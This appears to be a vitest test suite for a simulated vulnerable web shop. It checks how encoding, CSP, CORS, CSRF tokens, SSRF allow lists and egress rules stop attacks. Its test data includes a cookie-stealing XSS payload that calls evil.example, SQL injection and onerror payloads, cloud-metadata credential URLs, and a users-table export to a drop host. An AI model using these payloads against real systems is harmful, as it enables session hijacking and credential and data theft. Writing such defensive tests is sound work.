import { describe, expect, it } from 'vitest';
import { USERS } from './data';
import { createEvil, EVIL_ORIGIN, evilDropped, evilStolen } from './evil';
import { hostOf, type WebResponse } from './http';
import { createImages, createInternal, INTERNAL_HOSTS } from './internal';
import { loadInner, loadPage } from './page';
import { createShop, SHOP_ORIGIN, type ShopOptions } from './shop';
import { APP_ORIGIN } from './shop-cors';
import { createWorld, type World } from './world';

const NONE: Partial<ShopOptions> = { cookie: { httpOnly: true, secure: true, sameSite: 'None' } };

function setup(overrides: Partial<ShopOptions> = {}) {
  const site = createShop(overrides);
  const world = createWorld([site, createEvil(), createInternal(), createImages()]);
  const signIn = (name = 'alice', password = 'sunshine') => world.browser.submit(`${SHOP_ORIGIN}/signin`, { name, password });
  return { site, world, db: site.db!, signIn };
}

const get = (world: World, path: string, headers: Record<string, string> = {}) => world.send({ method: 'GET', url: `${SHOP_ORIGIN}${path}`, headers, body: {} }, 'browser');
const options = (world: World, path: string, origin: string) => world.send({ method: 'OPTIONS', url: `${SHOP_ORIGIN}${path}`, headers: { origin }, body: {} }, 'browser');

const allowOrigin = (answer: WebResponse) => answer.headers['access-control-allow-origin'];

describe('encode', () => {
  it('puts markup into /search with it off, and escapes it with it on', () => {
    expect(get(setup({ encode: false }).world, '/search?q=%3Cb%3E').body).toContain('<b>');
    const encoded = get(setup({ encode: true }).world, '/search?q=%3Cb%3E').body;
    expect(encoded).toContain('&lt;b&gt;');
    expect(encoded).not.toContain('<b>');
  });

  it.each([
    [false, '<b>hi</b>'],
    [true, '&lt;b&gt;hi&lt;/b&gt;'],
  ])('shows a stored comment to another user with encode %s', (encode, shown) => {
    const { world, signIn } = setup({ encode });
    signIn('bob');
    expect(world.browser.submit(`${SHOP_ORIGIN}/comments`, { body: '<b>hi</b>' }).status).toBe(200);
    signIn('alice');
    expect(world.browser.visit(`${SHOP_ORIGIN}/comments`).body).toContain(`bob: ${shown}`);
  });

  it('needs a session to post a comment', () => {
    expect(setup().world.browser.submit(`${SHOP_ORIGIN}/comments`, { body: 'hi' }).status).toBe(401);
  });

  it('keeps a quote in a comment as plain data', () => {
    const { world, signIn, db } = setup();
    signIn();
    world.browser.submit(`${SHOP_ORIGIN}/comments`, { body: "it's'; DROP TABLE users --" });
    expect(db.rows('users')).toHaveLength(4);
    expect(db.rows('comments')).toEqual([{ id: 1, author: 'alice', body: "it's'; DROP TABLE users --" }]);
  });

  it.each([
    [false, 1],
    [true, 0],
  ])('/welcome writes the hash with innerHTML or textContent, with encode %s', (encode, count) => {
    const payload = '<img src=x onerror=alert(1)>';
    const { world } = setup({ encode, csp: 'none' });
    expect(loadInner(world, `${SHOP_ORIGIN}/welcome#${payload}`, payload).scripts.filter((script) => script.source === 'alert(1)')).toHaveLength(count);
    expect(world.events.at(-1)!.request.url).toBe(`${SHOP_ORIGIN}/welcome`);
  });
});

describe('csp', () => {
  const policy = (answer: WebResponse) => answer.headers['content-security-policy'];

  it('sends no header with it off', () => {
    expect(policy(get(setup({ csp: 'none' }).world, '/search?q=a'))).toBeUndefined();
  });

  it('allows inline scripts under unsafeInline', () => {
    expect(policy(get(setup({ csp: 'unsafeInline' }).world, '/search?q=a'))).toBe("script-src 'self' 'unsafe-inline'");
  });

  it.each(['/search?q=a', '/comments', '/welcome'])('gives %s a nonce, and the page own script carries it', (path) => {
    const answer = get(setup({ csp: 'nonce' }).world, path);
    const nonce = /'nonce-([0-9a-f]+)'/.exec(policy(answer) ?? '')?.[1];
    expect(nonce).toBeDefined();
    expect(answer.body).toContain(`<script nonce="${nonce}">`);
  });

  it('uses a fresh nonce on each page', () => {
    const { world } = setup({ csp: 'nonce' });
    expect(policy(get(world, '/search?q=a'))).not.toBe(policy(get(world, '/search?q=a')));
  });

  it.each(['none', 'unsafeInline', 'nonce'] as const)("runs the page's own script under %s", (csp) => {
    const { scripts } = loadPage(setup({ csp }).world, `${SHOP_ORIGIN}/search?q=a`);
    expect(scripts.map((script) => script.status)).toEqual(['ran']);
  });
});

describe('cors', () => {
  const CREDENTIALS = 'access-control-allow-credentials';

  it.each<[ShopOptions['cors'], string, string | undefined, string | undefined]>([
    ['none', EVIL_ORIGIN, undefined, undefined],
    ['one', EVIL_ORIGIN, APP_ORIGIN, 'true'],
    ['one', APP_ORIGIN, APP_ORIGIN, 'true'],
    ['reflect', EVIL_ORIGIN, EVIL_ORIGIN, 'true'],
    ['reflect', 'https://any.example', 'https://any.example', 'true'],
    ['wildcard', EVIL_ORIGIN, '*', undefined],
  ])('%s for %s', (cors, origin, allowed, credentials) => {
    const { world } = setup({ cors });
    for (const answer of [get(world, '/account', { origin }), options(world, '/account', origin)]) {
      expect(allowOrigin(answer)).toBe(allowed);
      expect(answer.headers[CREDENTIALS]).toBe(credentials);
    }
  });

  it('lets a credentialed page read the account only under reflect', () => {
    for (const [cors, readable] of [['none', false], ['one', false], ['reflect', true], ['wildcard', false]] as const) {
      const { world, signIn } = setup({ ...NONE, cors });
      signIn();
      const answer = world.browser.fetchFrom(EVIL_ORIGIN, `${SHOP_ORIGIN}/account`, { credentials: true });
      expect(answer.status, cors).toBe(200);
      expect(answer.readable, cors).toBe(readable);
    }
  });

  it('lets the named front end read it', () => {
    const { world, signIn } = setup({ cors: 'one' });
    signIn();
    expect(world.browser.fetchFrom(APP_ORIGIN, `${SHOP_ORIGIN}/account`, { credentials: true })).toMatchObject({ readable: true });
  });

  it('changes the name through a PUT that passes the preflight', () => {
    const { world, signIn, db } = setup({ ...NONE, cors: 'reflect' });
    signIn();
    expect(world.browser.fetchFrom(EVIL_ORIGIN, `${SHOP_ORIGIN}/account`, { method: 'PUT', credentials: true, body: { name: 'mallory' } }).sent).toBe(true);
    expect(db.query("SELECT name FROM users WHERE name = 'mallory'")).toHaveLength(1);
  });
});

describe('csrf', () => {
  const place = (world: World, initiator = EVIL_ORIGIN, extra: Record<string, string> = {}) => world.browser.submit(`${SHOP_ORIGIN}/orders`, { item: 'Sofa', ...extra }, initiator);
  const image = (world: World, query = '') => world.browser.subresource(`${SHOP_ORIGIN}/orders/new?item=Sofa${query}`, EVIL_ORIGIN);
  const placed = (db: ReturnType<typeof setup>['db']) => db.query("SELECT owner FROM orders WHERE item = 'Sofa'");
  const token = (world: World) => /name="token" value="([0-9a-f]+)"/.exec(world.browser.visit(`${SHOP_ORIGIN}/order-form`).body)![1]!;

  it.each<[ShopOptions['csrf'], 'form' | 'image', number]>([
    ['none', 'form', 1],
    ['none', 'image', 1],
    ['token', 'form', 0],
    ['token', 'image', 0],
    ['origin', 'form', 0],
    ['origin', 'image', 1],
  ])('%s against %s', (csrf, attack, orders) => {
    const { world, db, signIn } = setup({ ...NONE, csrf });
    signIn();
    if (attack === 'form') place(world);
    else image(world);
    expect(placed(db)).toHaveLength(orders);
  });

  it('puts the owner on the new order', () => {
    const { world, db, signIn } = setup({ ...NONE, csrf: 'none' });
    signIn();
    place(world);
    expect(placed(db)).toEqual([{ owner: 'alice' }]);
  });

  it('accepts the token from /order-form on both routes', () => {
    const { world, db, signIn } = setup({ ...NONE, csrf: 'token' });
    signIn();
    const value = token(world);
    expect(place(world, SHOP_ORIGIN, { token: value }).status).toBe(200);
    expect(image(world, `&token=${value}`).status).toBe(200);
    expect(placed(db)).toHaveLength(2);
  });

  it('refuses a wrong token, and a token from another session', () => {
    const { world, signIn } = setup({ ...NONE, csrf: 'token' });
    signIn();
    const alices = token(world);
    expect(place(world, SHOP_ORIGIN, { token: 'wrong' }).status).toBe(403);
    signIn('bob');
    expect(place(world, SHOP_ORIGIN, { token: alices }).status).toBe(403);
  });

  it('accepts a form from the shop under origin', () => {
    const { world, signIn } = setup({ ...NONE, csrf: 'origin' });
    signIn();
    expect(place(world, SHOP_ORIGIN).status).toBe(200);
  });

  it('needs a session', () => {
    expect(place(setup({ csrf: 'none' }).world).status).toBe(401);
  });

  it('sends no Lax cookie with either attack', () => {
    const { world, db, signIn } = setup({ csrf: 'none' });
    signIn();
    expect(place(world).status).toBe(401);
    expect(image(world).status).toBe(401);
    expect(placed(db)).toEqual([]);
  });
});

describe('preview', () => {
  const preview = (world: World, url: string) => get(world, `/preview?url=${encodeURIComponent(url)}`);
  const CREDENTIALS = 'SecretAccessKey';
  const METADATA_IP = 'http://169.254.169.254/latest/credentials';
  const METADATA_NAME = 'http://metadata.internal/latest/credentials';
  const REDIRECT = 'https://evil.example/go';

  it.each<[string, ShopOptions['preview'], number]>([
    [METADATA_IP, 'open', 200],
    [METADATA_IP, 'blocklist', 403],
    [METADATA_IP, 'allowList', 403],
    [METADATA_NAME, 'open', 200],
    [METADATA_NAME, 'blocklist', 200],
    [METADATA_NAME, 'allowList', 403],
    [REDIRECT, 'open', 200],
    [REDIRECT, 'blocklist', 200],
    [REDIRECT, 'allowList', 403],
    ['https://images.example/cat.png', 'open', 200],
    ['https://images.example/cat.png', 'blocklist', 200],
    ['https://images.example/cat.png', 'allowList', 200],
    ['https://real-site.com/', 'open', 502],
    ['https://real-site.com/', 'blocklist', 502],
    ['https://real-site.com/', 'allowList', 403],
  ])('%s under %s', (url, mode, status) => {
    const answer = preview(setup({ preview: mode }).world, url);
    expect(answer.status).toBe(status);
    expect(answer.body.includes(CREDENTIALS)).toBe(status === 200 && !url.includes('images'));
  });

  it('follows no redirect from an allowed host under allowList', () => {
    const answer = preview(setup({ preview: 'allowList' }).world, 'https://images.example/moved');
    expect(answer.status).toBe(502);
    expect(answer.body).not.toContain(CREDENTIALS);
  });

  it('follows it under open', () => {
    expect(preview(setup({ preview: 'open' }).world, 'https://images.example/moved').body).toContain(CREDENTIALS);
  });

  it('stops after three redirects', () => {
    const { world } = setup({ preview: 'open' });
    expect(preview(world, 'https://evil.example/loop').status).toBe(502);
    expect(world.events.filter((event) => event.from === 'shop')).toHaveLength(4);
  });

  it('asks from the shop, inside the network', () => {
    const { world } = setup({ preview: 'open' });
    preview(world, METADATA_NAME);
    expect(world.events.at(-1)).toMatchObject({ from: 'shop', to: 'internal' });
  });

  it.each(INTERNAL_HOSTS)('answers on %s', (host) => {
    expect(preview(setup({ preview: 'open' }).world, `http://${host}/latest/credentials`).body).toContain(CREDENTIALS);
  });

  it.each(INTERNAL_HOSTS)('gives a browser or attacker a network error on %s', (host) => {
    const { world } = setup();
    const url = `http://${host}/latest/credentials`;
    expect(world.browser.visit(url).status).toBe(0);
    expect(world.send({ method: 'GET', url, headers: {}, body: {} }, 'attacker').status).toBe(0);
    expect(world.events.at(-1)!.to).toBeNull();
  });
});

describe('admin export', () => {
  const run = (world: World, to: string) => {
    const cookie = `sid=${world.browser.jar()[0]!.value}`;
    return world.send({ method: 'POST', url: `${SHOP_ORIGIN}/admin/export?to=${encodeURIComponent(to)}`, headers: { cookie }, body: {} }, 'attacker');
  };
  const ROOT = USERS.at(-1)!;
  const DROP = 'https://evil.example/drop';

  it('sends the users table out with egress off', () => {
    const { world, signIn } = setup({ egress: false });
    signIn(ROOT.name, ROOT.password);
    expect(run(world, DROP).status).toBe(200);
    expect(evilDropped(world).join()).toContain('alice');
  });

  it('refuses with egress on', () => {
    const { world, signIn } = setup({ egress: true });
    signIn(ROOT.name, ROOT.password);
    expect(run(world, DROP).status).toBe(403);
    expect(evilDropped(world)).toEqual([]);
  });

  it('allows the backup host with egress on', () => {
    const { world, signIn } = setup({ egress: true });
    signIn(ROOT.name, ROOT.password);
    run(world, 'https://backup.shop.example/in');
    expect(hostOf(world.events.at(-1)!.request.url)).toBe('backup.shop.example');
  });

  it('checks the role first', () => {
    const { world, signIn } = setup({ egress: false });
    signIn();
    expect(run(world, DROP).status).toBe(403);
    expect(evilDropped(world)).toEqual([]);
  });

  it('needs a session', () => {
    const { world } = setup({ egress: false });
    expect(world.send({ method: 'POST', url: `${SHOP_ORIGIN}/admin/export?to=x`, headers: {}, body: {} }, 'attacker').status).toBe(401);
  });
});

describe('the evil site', () => {
  it('keeps what a script sends', () => {
    const { world } = setup({ encode: false, csp: 'none', cookie: { httpOnly: false, secure: true, sameSite: 'Lax' } });
    world.browser.submit(`${SHOP_ORIGIN}/signin`, { name: 'alice', password: 'sunshine' });
    const sid = world.browser.jar()[0]!.value;
    const payload = encodeURIComponent("<script>fetch('https://evil.example/c?' + document.cookie)</script>");
    const run = loadPage(world, `${SHOP_ORIGIN}/search?q=${payload}`);
    expect(run.scripts[0]!.status).toBe('ran');
    expect(evilStolen(world)).toEqual([`sid=${sid}`]);
  });

  it('serves a script in the page language', () => {
    const { world } = setup({ encode: false, csp: 'none' });
    const run = loadPage(world, `${SHOP_ORIGIN}/search?q=${encodeURIComponent(`<script src=${EVIL_ORIGIN}/x.js></script>`)}`);
    expect(run.scripts[0]).toMatchObject({ status: 'ran' });
    expect(evilStolen(world)).toEqual(['']);
  });
});
